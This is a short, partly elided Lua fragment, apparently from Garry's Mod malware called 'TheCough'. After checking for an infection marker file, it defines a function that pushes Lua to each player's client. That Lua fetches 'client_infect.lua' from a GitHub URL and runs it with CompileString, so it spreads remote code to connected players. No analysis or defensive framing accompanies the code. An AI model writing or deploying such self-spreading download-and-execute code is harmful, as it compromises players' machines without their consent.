...
timer.Simple(8, function()
	if file.Exists("download/engine_win32.dll", "MOD") then -- No longer infected?
		...
		local function infply(ply)
			ply:SendLua( [[http.Fetch("https://raw.githubusercontent.com/Defender2015/TheCough/master/client_infect.lua", function(c) local ret = CompileString(c, "l", false) pcall(ret) end, function() end)]])
